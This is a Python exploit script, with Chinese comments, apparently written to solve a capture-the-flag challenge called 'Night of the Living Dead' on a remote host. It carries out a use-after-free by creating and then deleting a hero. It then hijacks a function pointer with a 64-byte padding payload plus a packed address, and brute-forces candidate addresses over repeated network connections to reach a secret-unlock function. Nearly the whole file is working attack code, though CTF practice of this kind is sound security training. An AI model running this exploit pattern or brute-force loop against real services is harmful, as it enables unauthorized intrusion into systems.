#!/usr/bin/env python3
"""
远程exploit脚本 - 连接到night-of-the-living-dead.chall.edgesecurity.team:1343
"""

import socket
import struct
import time

def connect_remote():
    """连接到远程服务器"""
    host = "night-of-the-living-dead.chall.edgesecurity.team"
    port = 1343
    
    print(f"[+] 连接到 {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(s, pattern):
    """接收数据直到遇到指定模式"""
    data = b""
    while pattern not in data:
        data += s.recv(1)
    return data

def exploit_remote():
    """执行远程利用"""
    s = connect_remote()
    
    try:
        # 接收欢迎信息
        welcome = recv_until(s, b"Choice: ")
        print(f"[+] 收到欢迎信息:\n{welcome.decode()}")
        
        # 步骤1: 创建Hero
        print("[+] 步骤1: 创建Hero")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        s.send(b"TestHero\n")
        
        # 接收Hero创建信息，可能包含地址泄露
        hero_info = recv_until(s, b"Choice: ")
        print(f"[+] Hero信息: {hero_info.decode()}")
        
        # 步骤2: 删除Hero (Use-After-Free)
        print("[+] 步骤2: 删除Hero")
        s.send(b"2\n")
        drop_info = recv_until(s, b"Choice: ")
        print(f"[+] 删除信息: {drop_info.decode()}")
        
        # 步骤3: 训练假人 (函数指针劫持)
        print("[+] 步骤3: 训练假人")
        s.send(b"4\n")
        recv_until(s, b"Describe the training dummy stats: ")
        
        # 尝试不同的函数地址
        # 通常64位程序的代码段在0x400000附近
        possible_addresses = [
            0x40123a,  # 常见的函数地址
            0x4011e9,
            0x401234,
            0x4012a0,
            0x401290,
            0x4011f0,
            0x401200,
            0x401210,
            0x401220,
            0x401230,
        ]
        
        # 先尝试第一个地址
        unlock_addr = possible_addresses[0]
        print(f"[+] 尝试地址: 0x{unlock_addr:x}")
        
        # 构造payload: 64字节填充 + 函数地址
        payload = b"A" * 64 + struct.pack("<Q", unlock_addr)
        s.send(payload)
        
        dummy_info = recv_until(s, b"Choice: ")
        print(f"[+] 假人信息: {dummy_info.decode()}")
        
        # 步骤4: 执行攻击
        print("[+] 步骤4: 执行攻击")
        s.send(b"3\n")
        
        # 接收结果
        result = s.recv(4096)
        print(f"[SUCCESS] 结果: {result.decode()}")
        
        if b"flag" in result.lower() or b"edge" in result.lower():
            print("[SUCCESS] 可能获得了flag!")
        else:
            print("[-] 可能需要尝试其他地址")
            
    except Exception as e:
        print(f"[-] 利用过程中出错: {e}")
    finally:
        s.close()

def brute_force_address():
    """暴力破解函数地址"""
    base_addresses = [
        0x401000,
        0x400000,
    ]
    
    for base in base_addresses:
        for offset in range(0x100, 0x300, 0x10):
            addr = base + offset
            print(f"[+] 尝试地址: 0x{addr:x}")
            
            try:
                s = connect_remote()
                
                # 快速执行利用流程
                s.send(b"1\nTestHero\n2\n4\n")
                recv_until(s, b"Describe the training dummy stats: ")
                
                payload = b"A" * 64 + struct.pack("<Q", addr)
                s.send(payload)
                recv_until(s, b"Choice: ")
                
                s.send(b"3\n")
                result = s.recv(1024)
                
                if b"flag" in result.lower() or b"debug print" in result:
                    print(f"[SUCCESS] 找到正确地址: 0x{addr:x}")
                    print(f"[SUCCESS] 结果: {result.decode()}")
                    s.close()
                    return addr
                    
                s.close()
                time.sleep(0.1)  # 避免请求过快
                
            except:
                continue
    
    return None

def interactive_mode():
    """交互模式 - 手动输入函数地址"""
    print("[+] 交互模式")
    addr_input = input("请输入unlock_secret_level函数地址 (hex, 如0x401234): ")
    
    try:
        unlock_addr = int(addr_input, 16)
    except:
        print("[-] 地址格式错误")
        return
    
    s = connect_remote()
    
    try:
        # 执行利用
        recv_until(s, b"Choice: ")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        s.send(b"TestHero\n")
        recv_until(s, b"Choice: ")
        
        s.send(b"2\n")
        recv_until(s, b"Choice: ")
        
        s.send(b"4\n")
        recv_until(s, b"Describe the training dummy stats: ")
        
        payload = b"A" * 64 + struct.pack("<Q", unlock_addr)
        s.send(payload)
        recv_until(s, b"Choice: ")
        
        s.send(b"3\n")
        result = s.recv(4096)
        print(f"[+] 结果: {result.decode()}")
        
    finally:
        s.close()

if __name__ == "__main__":
    print("Night of the Living Dead - 远程Exploit")
    print("[+] 开始暴力破解模式...")
    result_addr = brute_force_address()
    if result_addr:
        print(f"[SUCCESS] 利用成功！函数地址: 0x{result_addr:x}")
    else:
        print("[-] 未找到正确的函数地址")